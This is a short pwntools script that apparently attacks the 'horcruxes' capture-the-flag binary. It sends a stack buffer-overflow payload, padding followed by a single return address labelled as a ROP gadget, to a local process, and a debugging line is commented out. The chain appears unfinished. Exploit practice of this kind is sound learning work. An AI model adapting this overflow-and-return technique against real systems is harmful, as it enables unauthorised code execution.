from pwn import *
context.clear(arch='i386', os='linux')
context.binary = e = ELF('./horcruxes')
rop = b'a' * (0x74 + 4+1)
# last gadget -> go back to ropme
rop += p32(0x0809fffc) 
print(rop)
#r = gdb.debug('./horcruxes', 'break ropme')
r = process('./horcruxes')
r.sendline(rop)
r.interactive()
